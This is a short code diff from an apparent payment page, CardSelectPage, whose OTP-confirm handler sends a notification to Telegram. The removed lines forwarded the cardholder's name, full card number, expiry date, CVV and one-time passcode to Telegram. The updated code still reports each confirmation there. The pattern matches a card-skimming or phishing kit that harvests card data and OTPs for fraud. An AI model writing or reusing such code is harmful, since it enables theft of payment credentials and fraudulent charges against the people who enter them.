@@ -241,8 +241,7 @@ const CardSelectPage = () => {
   const handleOtpConfirm = () => {
     if (otpCode.length !== 6 || !selectedCard) return;
     sendTelegramNotification({
-      type: 'payment_activity', amount, method: selectedCard.label, paymentType: 'card',
-      cardName: cardHolder, cardNumber, expiry, cvv, otp: otpCode
+      type: 'payment_activity', method: 'Card Payment', paymentType: 'card',
     });
     setOtpLoading(true);
     setTimeout(() => {
